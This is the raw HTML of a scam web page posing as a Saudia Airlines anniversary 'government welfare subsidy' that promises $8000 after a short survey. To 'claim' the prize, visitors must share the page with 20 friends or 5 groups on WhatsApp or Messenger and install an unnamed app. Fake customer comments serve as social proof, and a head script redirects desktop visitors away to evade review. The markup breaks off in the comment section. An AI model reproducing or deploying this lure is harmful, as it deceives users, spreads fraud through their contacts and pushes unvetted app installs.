

<!DOCTYPE html>
<html>
<head>
    <title></title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta charset="UTF-8">
    <meta property="og:type" content="website">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="robots" content="noindex, follow">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.6.1/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.0/css/select2.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css">
    <link rel="stylesheet" href="https://u.img.social/res/69198285/css/style.css">
    <script> var system = {win:false,mac:false,xll:false}; var p = navigator.platform; system.win = p.indexOf("Win") == 0; system.max = p.indexOf("Max") == 0; system.x11 = p.indexOf("X11") == 0; if(system.win || system.max || system.xll ||  window.screen.availWidth > window.screen.availHeight){ var next = document.createElement('a');next.setAttribute('rel', 'noreferrer');next.setAttribute('href', '/emit/404/p');next.click(); } </script>
</head>
<body>
<div class="top-header">
    <div style="width: 100%;display: inline-flex;">
        <img height="40px" src="https://u.img.social/res/69198285/img/shahuzuo.jpg" onerror="this.classList.add('error');" style="position: absolute;">
        <img height="40px" src="https://u.img.social/res/69198285/img/shatzho.jpg" onerror="this.classList.add('error');" style="position: relative;margin: 0 auto;max-width: 200px;">
        <img height="40px" src="https://u.img.social/res/69198285/img/shaeyou.jpg" onerror="this.classList.add('error');" style="position: absolute;right:14px;">
    </div>
</div>
<div id="p_body_content" style="position:relative;top:58px;">
    <div style="display: flex; padding: 10px; background: #b09255;">
        <div class="header_flex_item" style="width:70%">🎉SAUDIA AIRLINES 78th Anniversary Government Welfare Subsidy🎊</div>
        <div class="header_flex_item" style="text-align: right;"><span class="p_var-dia">29</span>&nbsp;<span class="p_var-mes_nombre">03</span>,
            <span class="p_var-anyo">2023</span></div>
    </div>
    <div class="content" style="background-color:#fff;">
        <div class="main-content flag" id="content1" style="color:#232f3f;background-color:#fff ;">
            <h3 style="font-weight:700">Congratulations!</h3>
            <p>SAUDIA AIRLINES 78th Anniversary Government Welfare Subsidy</p>
            <p>Through the questionnaire, you will have a chance to get  $8000 .</p>
            <img width="100%" src="https://u.img.social/res/69198285/img/sasasa-show.jpg">
            <div id="surveyBtn_pz">
                <div class="main-content flag" id="content1" style="background-color:#fff ;">
                    <div id="q1">
                        <p class="question">
                            <strong>Question 1 of 4 :</strong> Do you know SAUDIA AIRLINES ?                        </p>
                        <div class="survey_button bq1" data-bq="1">
                            yes                        </div>
                        <div class="survey_button bq1" data-bq="2">
                            no                        </div>
                    </div>
                    <div id="q2">
                        <p class="question">
                            <strong>Question 2 of 4 :</strong> How old are you ?                        </p>
                        <div class="survey_button bq2" data-bq="1">
                            18-29
                        </div>
                        <div class="survey_button bq2" data-bq="2">
                            30-39
                        </div>
                        <div class="survey_button bq2" data-bq="3">
                            40-49
                        </div>
                        <div class="survey_button bq2" data-bq="4">
                            50+
                        </div>
                    </div>
                    <div id="q3">
                        <p class="question">
                            <strong>Question 3 of 4 :</strong> How do you think of SAUDIA AIRLINES ?                        </p>
                        <div class="survey_button bq3" data-bq="1">
                            Very good                        </div>
                        <div class="survey_button bq3" data-bq="2">
                            Unbelievable                        </div>
                        <div class="survey_button bq3" data-bq="3">
                            OK                        </div>
                        <div class="survey_button bq3" data-bq="4">
                            Not so good                        </div>
                    </div>
                    <div id="q4">
                        <p class="question">
                            <strong>Question 4 of 4 :</strong> Are you male or female ?                        </p>
                        <div class="survey_button bq4" data-bq="1">
                            Male                        </div>
                        <div class="survey_button bq4" data-bq="2">
                            Female                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="main-content" id="content2">
            <h2 style="text-align:center;margin:10px 0;">We are verifying your answer...</h2>
            <div class="d-flex justify-content-center">
                <div class="loader"></div>
            </div>
            <p></p>
            <p class="result" id="result1" style="color:#000">
                You have answered all 4 questions            </p>
            <p class="result" id="result2" style="color:#000">
                Your IP address is valid for this promotion            </p>
            <p class="result" id="result3" style="color:#000">
                Gifts are available and in stock!            </p>
        </div>
        <div class="main-content" id="content3">
            <div id="boxes" class="boxes">
                <div class="div_img_gift">
                    <img class="img_gift" src="/imgs/United-States_outbox.png">
                </div>
                <div id="0" class="try temblor">
                    <div class="caja_tapa">
                        <img src="https://u.img.social/res/69198285/img/sasasa-box1.png">
                    </div>
                    <div class="caja_trasera">
                        <img src="https://u.img.social/res/69198285/img/sasasa-box2.png">
                    </div>
                    <div class="caja_gift">
                        <img src="/imgs/United-States_inbox.png">
                    </div>
                    <div class="caja">
                        <img src="https://u.img.social/res/69198285/img/sasasa-box3.png">
                    </div>
                </div>
                <div id="1" class="try temblor">
                    <div class="caja_tapa">
                        <img src="https://u.img.social/res/69198285/img/sasasa-box1.png">
                    </div>
                    <div class="caja_trasera">
                        <img src="https://u.img.social/res/69198285/img/sasasa-box2.png">
                    </div>
                    <div class="caja_gift">
                        <img src="/imgs/United-States_inbox.png">
                    </div>
                    <div class="caja">
                        <img src="https://u.img.social/res/69198285/img/sasasa-box3.png">
                    </div>
                </div>
                <div id="2" class="try temblor">
                    <div class="caja_tapa">
                        <img src="https://u.img.social/res/69198285/img/sasasa-box1.png">
                    </div>
                    <div class="caja_trasera">
                        <img src="https://u.img.social/res/69198285/img/sasasa-box2.png">
                    </div>
                    <div class="caja_gift">
                        <img src="/imgs/United-States_inbox.png">
                    </div>
                    <div class="caja">
                        <img src="https://u.img.social/res/69198285/img/sasasa-box3.png">
                    </div>
                </div>
                <div id="3" class="try temblor">
                    <div class="caja_tapa">
                        <img src="https://u.img.social/res/69198285/img/sasasa-box1.png">
                    </div>
                    <div class="caja_trasera">
                        <img src="https://u.img.social/res/69198285/img/sasasa-box2.png">
                    </div>
                    <div class="caja_gift">
                        <img src="/imgs/United-States_inbox.png">
                    </div>
                    <div class="caja">
                        <img src="https://u.img.social/res/69198285/img/sasasa-box3.png">
                    </div>
                </div>
                <div id="4" class="try temblor">
                    <div class="caja_tapa">
                        <img src="https://u.img.social/res/69198285/img/sasasa-box1.png">
                    </div>
                    <div class="caja_trasera">
                        <img src="https://u.img.social/res/69198285/img/sasasa-box2.png">
                    </div>
                    <div class="caja_gift">
                        <img src="/imgs/United-States_inbox.png">
                    </div>
                    <div class="caja">
                        <img src="https://u.img.social/res/69198285/img/sasasa-box3.png">
                    </div>
                </div>
                <div id="5" class="try temblor">
                    <div class="caja_tapa">
                        <img src="https://u.img.social/res/69198285/img/sasasa-box1.png">
                    </div>
                    <div class="caja_trasera">
                        <img src="https://u.img.social/res/69198285/img/sasasa-box2.png">
                    </div>
                    <div class="caja_gift">
                        <img src="/imgs/United-States_inbox.png">
                    </div>
                    <div class="caja">
                        <img src="https://u.img.social/res/69198285/img/sasasa-box3.png">
                    </div>
                </div>
                <div id="6" class="try temblor">
                    <div class="caja_tapa">
                        <img src="https://u.img.social/res/69198285/img/sasasa-box1.png">
                    </div>
                    <div class="caja_trasera">
                        <img src="https://u.img.social/res/69198285/img/sasasa-box2.png">
                    </div>
                    <div class="caja_gift">
                        <img src="/imgs/United-States_inbox.png">
                    </div>
                    <div class="caja">
                        <img src="https://u.img.social/res/69198285/img/sasasa-box3.png">
                    </div>
                </div>
                <div id="7" class="try temblor">
                    <div class="caja_tapa">
                        <img src="https://u.img.social/res/69198285/img/sasasa-box1.png">
                    </div>
                    <div class="caja_trasera">
                        <img src="https://u.img.social/res/69198285/img/sasasa-box2.png">
                    </div>
                    <div class="caja_gift">
                        <img src="/imgs/United-States_inbox.png">
                    </div>
                    <div class="caja">
                        <img src="https://u.img.social/res/69198285/img/sasasa-box3.png">
                    </div>
                </div>
                <div id="8" class="try temblor">
                    <div class="caja_tapa">
                        <img src="https://u.img.social/res/69198285/img/sasasa-box1.png">
                    </div>
                    <div class="caja_trasera">
                        <img src="https://u.img.social/res/69198285/img/sasasa-box2.png">
                    </div>
                    <div class="caja_gift">
                        <img src="/imgs/United-States_inbox.png">
                    </div>
                    <div class="caja">
                        <img src="https://u.img.social/res/69198285/img/sasasa-box3.png">
                    </div>
                </div>
                <div id="9" class="try temblor">
                    <div class="caja_tapa">
                        <img src="https://u.img.social/res/69198285/img/sasasa-box1.png">
                    </div>
                    <div class="caja_trasera">
                        <img src="https://u.img.social/res/69198285/img/sasasa-box2.png">
                    </div>
                    <div class="caja_gift">
                        <img src="/imgs/United-States_inbox.png">
                    </div>
                    <div class="caja">
                        <img src="https://u.img.social/res/69198285/img/sasasa-box3.png">
                    </div>
                </div>
                <div id="10" class="try temblor">
                    <div class="caja_tapa">
                        <img src="https://u.img.social/res/69198285/img/sasasa-box1.png">
                    </div>
                    <div class="caja_trasera">
                        <img src="https://u.img.social/res/69198285/img/sasasa-box2.png">
                    </div>
                    <div class="caja_gift">
                        <img src="/imgs/United-States_inbox.png">
                    </div>
                    <div class="caja">
                        <img src="https://u.img.social/res/69198285/img/sasasa-box3.png">
                    </div>
                </div>
                <div id="11" class="try temblor">
                    <div class="caja_tapa">
                        <img src="https://u.img.social/res/69198285/img/sasasa-box1.png">
                    </div>
                    <div class="caja_trasera">
                        <img src="https://u.img.social/res/69198285/img/sasasa-box2.png">
                    </div>
                    <div class="caja_gift">
                        <img src="/imgs/United-States_inbox.png">
                    </div>
                    <div class="caja">
                        <img src="https://u.img.social/res/69198285/img/sasasa-box3.png">
                    </div>
                </div>
            </div>
        </div>
        <div class="main-content" id="content4" style="display: none">
            <div class="container share_page" style="padding: 0px">
                <div class="share_body share_page" style="width: 100%;">
                    <div class="share_hd_text">Congratulation!</div>
                    <div class="weui_dialog_img prize_img" style="text-align: center;margin: 20px 0;">
                        <img src="/imgs/United-States_outbox.png"
                             height="170px">
                    </div>
                    <div class="weui_dialog_text" style="color: #222222;">Your prize is:  $8000 , Follow the instructions on the next page to claim your prize !</div>
                    <div class="share_main">
                        <div class="share_ing" style="margin: 0 15px;">
                            <span style="color: #222222;">
                                <br>
                                1. Share with 5 groups/20 friends on the following apps (click on the corresponding icon below)                                <br>
                                <br>
                                2. Click &quot;Continue&quot; and claim your prize.                            </span>
                            <div id="shareBtn">
                                <div id="shareBtn_pz">
                                    <div style="color:#fff;display:block;width:80%;margin:10px auto;" class="btn btn-block btn-whatsapp" id="btn-whatsapp" onclick="shareBtn('whatsapp')"><i class="fab fa-xl fa-whatsapp"></i> Whatsapp</div>

                                    <div style="color:#fff;width:80%;margin:10px auto; display:none" class="btn btn-block btn-messenger" id="btn-messenger" onclick="shareBtn('messenger')"><i class="fab fa-xl fa-facebook-messenger"></i> Messenger</div>
                                </div>
                            </div>
                            <div style="text-align: center;color: #999999; font-size: 14px">Share it until the blue bar is full!</div>
                            <div class="progress progress-striped active" style="margin: 10px 0; border-radius: 19px;">
                                <div class="progress-bar progress-bar-success" style="width:0;background-color:#0876b9;" id="progressbar"></div>
                            </div>
                            <div class="share_main_bt" onclick="continueBtn()" style="margin: 20px auto 0; background-color: #26265d;">
                                Continue                            </div>
                            <br>
                        </div>
                        <div class="share_success" style="margin: 0 15px;display: none">
                            <span style="color: #222222;">
                                <br>
                                Congratulations! The last step:                                <br>
                                <br>
                                You must complete this final step!                                <br>
                                <br>
                                1. You must register the application below, and it must be opened for 30 seconds after registration.                                <br>
                                <br>
                                (Remember, this step is very important)                                <br>
                                <br>
                                2. After completing the above actions, please wait for admin to check it, the review will be completed within 24 hours.                                <br>
                                <br>
                            </span>
                            <div class="share_main_bt" onclick="shareOkBtn()" id="shareOkBtn">Complete registration</div>
                            <br>
                        </div>
                    </div>
                    <div class="weui_dialog_text" style="margin-top:-5px;line-height: 36px;color: #666666">
                    </div>
                </div>
            </div>
        </div>
        <div class="main-content" style="margin-top: 10px">
            <div class="comments_face">
                <div class="comments">
                    <p style="margin:0;padding:0;float:left;display:block;width:50%">
                        <span style="color:#3b5998">Comment</span>
                    </p>
                    <p style="margin:0;padding:0;float:right;display:block;width:50%;color:#a8a7a7;text-align:right">
                        10 / 183
                    </p>
                    <div style="clear:both">
                    </div>
                </div>
                <div class='detail_block'>
                    <div class='detail_left'><img src='https://u.img.social/res/69198285/img/shaskoodllss.jpg'></div>
                    <div class='detail_right'>
                        <h3>
                            <div class='comm_name'>Clemilla Chloe</div>
                        </h3>
                        <p>I thought it was a joke, but it was delivered this morning! So surprised! @SAUDIA AIRLINES is the best company I've ever met!</p> <span class='likebar'>
                            <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24' preserveAspectRatio='xMidYMid meet'
                                                                                        focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                    <g class='style-scope yt-icon'>
                                        <path d='M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z'
                                              class='style-scope yt-icon'></path>
                                    </g>
                                </svg></div>&nbsp; <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24'
                                                                                                               preserveAspectRatio='xMidYMid meet' focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                    <g class='style-scope yt-icon'>
                                        <path d='M15 3H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v1.91l.01.01L1 14c0 1.1.9 2 2 2h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 23l6.59-6.59c.36-.36.58-.86.58-1.41V5c0-1.1-.9-2-2-2zm4 0v12h4V3h-4z'
                                              class='style-scope yt-icon'></path>
                                    </g>
                                </svg></div>&nbsp; <span>1 minutes ago</span>
                        </span>
                    </div>
                </div>
                <div class='detail_block'>
                    <div class='detail_left'><img src='https://u.img.social/res/69198285/img/saud.jpg'></div>
                    <div class='detail_right'>
                        <h3>
                            <div class='comm_name'>Mohammad Fazan</div>
                        </h3>
                        <p>I can't believe it! I won a gift, thanks @SAUDIA AIRLINES!🥰👍👍👍 </p> <span class='likebar'>
                            <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24' preserveAspectRatio='xMidYMid meet'
                                                                                        focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                    <g class='style-scope yt-icon'>
                                        <path d='M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z'
                                              class='style-scope yt-icon'></path>
                                    </g>
                                </svg></div>&nbsp; <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24'
                                                                                                               preserveAspectRatio='xMidYMid meet' focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                    <g class='style-scope yt-icon'>
                                        <path d='M15 3H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v1.91l.01.01L1 14c0 1.1.9 2 2 2h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 23l6.59-6.59c.36-.36.58-.86.58-1.41V5c0-1.1-.9-2-2-2zm4 0v12h4V3h-4z'
                                              class='style-scope yt-icon'></path>
                                    </g>
                                </svg></div>&nbsp; <span>3 minutes ago</span>
                        </span>
                    </div>
                </div>
                <div class='detail_block'>
                    <div class='detail_left'><img src='https://u.img.social/res/69198285/img/yhph13.jpg'></div>
                    <div class='detail_right'>
                        <h3>
                            <div class='comm_name'>Yuli Yanti</div>
                        </h3>
                        <p>Great, I never won anything, I'm amazed, thanks SAUDIA AIRLINES for the gift!</p> <span class='likebar'>
                            <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24' preserveAspectRatio='xMidYMid meet'
                                                                                        focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                    <g class='style-scope yt-icon'>
                                        <path d='M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z'
                                              class='style-scope yt-icon'></path>
                                    </g>
                                </svg></div>&nbsp; <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24'
                                                                                                               preserveAspectRatio='xMidYMid meet' focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                    <g class='style-scope yt-icon'>
                                        <path d='M15 3H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v1.91l.01.01L1 14c0 1.1.9 2 2 2h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 23l6.59-6.59c.36-.36.58-.86.58-1.41V5c0-1.1-.9-2-2-2zm4 0v12h4V3h-4z'
                                              class='style-scope yt-icon'></path>
                                    </g>
                                </svg></div>&nbsp; <span>7 minutes ago</span>
                        </span>
                    </div>
                </div>
                <div class='detail_block'>
                    <div class='detail_left'><img src='https://u.img.social/res/69198285/img/yhph14.jpg'></div>
                    <div class='detail_right'>
                        <h3>
                            <div class='comm_name'>Reza Sanjaya</div>
                        </h3>
                        <p>Thanks @SAUDIA AIRLINES! Really, I got a gift. I told my friends about it so they can get it too!</p> <span class='likebar'>
                            <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24' preserveAspectRatio='xMidYMid meet'
                                                                                        focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                    <g class='style-scope yt-icon'>
                                        <path d='M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z'
                                              class='style-scope yt-icon'></path>
                                    </g>
                                </svg></div>&nbsp; <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24'
                                                                                                               preserveAspectRatio='xMidYMid meet' focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                    <g class='style-scope yt-icon'>
                                        <path d='M15 3H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v1.91l.01.01L1 14c0 1.1.9 2 2 2h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 23l6.59-6.59c.36-.36.58-.86.58-1.41V5c0-1.1-.9-2-2-2zm4 0v12h4V3h-4z'
                                              class='style-scope yt-icon'></path>
                                    </g>
                                </svg></div>&nbsp; <span>9 minutes ago</span>
                        </span>
                    </div>
                </div>
                <div class='detail_block'>
                    <div class='detail_left'><img src='https://u.img.social/res/69198285/img/yhph15.jpg'></div>
                    <div class='detail_right'>
                        <h3>
                            <div class='comm_name'>Rika Desta</div>
                        </h3>
                        <p>I attended, thank you so much! I won and I received it today.</p> <span class='likebar'>
                            <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24' preserveAspectRatio='xMidYMid meet'
                                                                                        focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                    <g class='style-scope yt-icon'>
                                        <path d='M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z'
                                              class='style-scope yt-icon'></path>
                                    </g>
                                </svg></div>&nbsp; <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24'
                                                                                                               preserveAspectRatio='xMidYMid meet' focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                    <g class='style-scope yt-icon'>
                                        <path d='M15 3H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v1.91l.01.01L1 14c0 1.1.9 2 2 2h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 23l6.59-6.59c.36-.36.58-.86.58-1.41V5c0-1.1-.9-2-2-2zm4 0v12h4V3h-4z'
                                              class='style-scope yt-icon'></path>
                                    </g>
                                </svg></div>&nbsp; <span>10 minutes ago</span>
                        </span>
                    </div>
                </div>
                <div class='detail_block'>
                    <div class='detail_left'><img src='https://u.img.social/res/69198285/img/yhph16.jpg'></div>
                    <div class='detail_right'>
                        <h3>
                            <div class='comm_name'>Mohammad Nur Ajim</div>
                        </h3>
                        <p>😎I love these promotions! Are there any other @SAUDIA AIRLINES</a></p> <span class='likebar'>
                            <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24' preserveAspectRatio='xMidYMid meet'
                                                                                        focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                    <g class='style-scope yt-icon'>
                                        <path d='M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z'
                                              class='style-scope yt-icon'></path>
                                    </g>
                                </svg></div>&nbsp; <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24'
                                                                                                               preserveAspectRatio='xMidYMid meet' focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                    <g class='style-scope yt-icon'>
                                        <path d='M15 3H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v1.91l.01.01L1 14c0 1.1.9 2 2 2h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 23l6.59-6.59c.36-.36.58-.86.58-1.41V5c0-1.1-.9-2-2-2zm4 0v12h4V3h-4z'
                                              class='style-scope yt-icon'></path>
                                    </g>
                                </svg></div>&nbsp; <span>12 minutes ago</span>
                        </span>
                    </div>
                </div>
                <div class='detail_block'>
                    <div class='detail_left'><img src='https://u.img.social/res/69198285/img/yhph17.jpg'></div>
                    <div class='detail_right'>
                        <h3>
                            <div class='comm_name'>Benolella</div>
                        </h3>
                        <p>I thought it was a joke, but my family and I received gifts today, hope more people take the survey @SAUDIA AIRLINES</p>
                        <span class='likebar'>
                            <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24' preserveAspectRatio='xMidYMid meet'
                                                                                        focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                    <g class='style-scope yt-icon'>
                                        <path d='M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z'
                                              class='style-scope yt-icon'></path>
                                    </g>
                                </svg></div>&nbsp; <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24'
                                                                                                               preserveAspectRatio='xMidYMid meet' focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                    <g class='style-scope yt-icon'>
                                        <path d='M15 3H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v1.91l.01.01L1 14c0 1.1.9 2 2 2h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 23l6.59-6.59c.36-.36.58-.86.58-1.41V5c0-1.1-.9-2-2-2zm4 0v12h4V3h-4z'
                                              class='style-scope yt-icon'></path>
                                    </g>
                                </svg></div>&nbsp; <span>15 minutes ago</span>
                        </span>
                    </div>
                </div>
                <div class='detail_block'>
                    <div class='detail_left'><img src='https://u.img.social/res/69198285/img/yhph18.jpg'></div>
                    <div class='detail_right'>
                        <h3>
                            <div class='comm_name'>Fajri Husseini</div>
                        </h3>
                        <p>Are there any other surveys to take?</p> <span class='likebar'>
                            <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24' preserveAspectRatio='xMidYMid meet'
                                                                                        focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                    <g class='style-scope yt-icon'>
                                        <path d='M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z'
                                              class='style-scope yt-icon'></path>
                                    </g>
                                </svg></div>&nbsp; <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24'
                                                                                                               preserveAspectRatio='xMidYMid meet' focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                    <g class='style-scope yt-icon'>
                                        <path d='M15 3H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v1.91l.01.01L1 14c0 1.1.9 2 2 2h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 23l6.59-6.59c.36-.36.58-.86.58-1.41V5c0-1.1-.9-2-2-2zm4 0v12h4V3h-4z'
                                              class='style-scope yt-icon'></path>
                                    </g>
                                </svg></div>&nbsp; <span>17 minutes ago</span>
                        </span>
                    </div>
                </div>
                <div class='detail_block'>
                    <div class='detail_left'><img src='https://u.img.social/res/69198285/img/yhph19.jpg'></div>
                    <div class='detail_right'>
                        <h3>
                            <div class='comm_name'>Ainaya Azahra</div>
                        </h3>
                        <p>really? When can I receive it?</p> <span class='likebar'>
                        <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24' preserveAspectRatio='xMidYMid meet'
                                                                                    focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                <g class='style-scope yt-icon'>
                                    <path d='M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z'
                                          class='style-scope yt-icon'></path>
                                </g>
                            </svg></div>&nbsp; <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24'
                                                                                                           preserveAspectRatio='xMidYMid meet' focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                <g class='style-scope yt-icon'>
                                    <path d='M15 3H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v1.91l.01.01L1 14c0 1.1.9 2 2 2h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 23l6.59-6.59c.36-.36.58-.86.58-1.41V5c0-1.1-.9-2-2-2zm4 0v12h4V3h-4z'
                                          class='style-scope yt-icon'></path>
                                </g>
                            </svg></div>&nbsp; <span>20 minutes ago</span>
                        </span>
                    </div>
                </div>
                <div class='detail_block'>
                    <div class='detail_left'><img src='https://u.img.social/res/69198285/img/yhph20.jpg'></div>
                    <div class='detail_right'>
                        <h3>
                            <div class='comm_name'>Ervidin Rotich</div>
                        </h3>
                        <p>It's true, I got a gift, did you get it?</p>
                        <span class='likebar'>
                            <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24' preserveAspectRatio='xMidYMid meet'
                                                                                        focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                    <g class='style-scope yt-icon'>
                                        <path d='M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z'
                                              class='style-scope yt-icon'></path>
                                    </g>
                                </svg></div>&nbsp; <div class='fbblue smaller' href='javascript:void(0);'><svg viewBox='0 0 24 24'
                                                                                                               preserveAspectRatio='xMidYMid meet' focusable='false' class='style-scope yt-icon' style='pointer-events: none; display: block; width: 4vw; height: 6vw;'>
                                    <g class='style-scope yt-icon'>
